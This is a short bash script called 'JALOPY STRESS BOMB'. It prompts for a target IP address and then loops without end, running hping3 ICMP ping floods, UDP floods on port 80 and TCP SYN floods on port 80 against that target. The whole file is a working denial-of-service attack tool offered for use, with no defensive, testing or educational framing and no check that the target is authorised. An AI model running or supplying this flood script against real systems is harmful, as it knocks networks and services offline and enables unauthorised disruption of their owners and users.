#!/bin/bash

# JALOPY STRESS BOMB
clear
echo "==========================="
echo "       JALOPY STRESS"
echo "==========================="
echo ""

# Ask for target IP
read -p "Enter the target IP address: " target

echo ""
echo "Starting stress attack on $target..."
sleep 2

while true
do
    echo "[*] PING FLOOD (ICMP)"
    sudo hping3 -1 --flood $target -i u100 &
    sleep 10
    pkill hping3

    echo "[*] UDP FLOOD (port 80)"
    sudo hping3 --udp -p 80 --flood $target -d 1400 -i u100 &
    sleep 10
    pkill hping3

    echo "[*] TCP SYN FLOOD (port 80)"
    sudo hping3 -S --flood -p 80 $target -i u100 &
    sleep 10
    pkill hping3
done
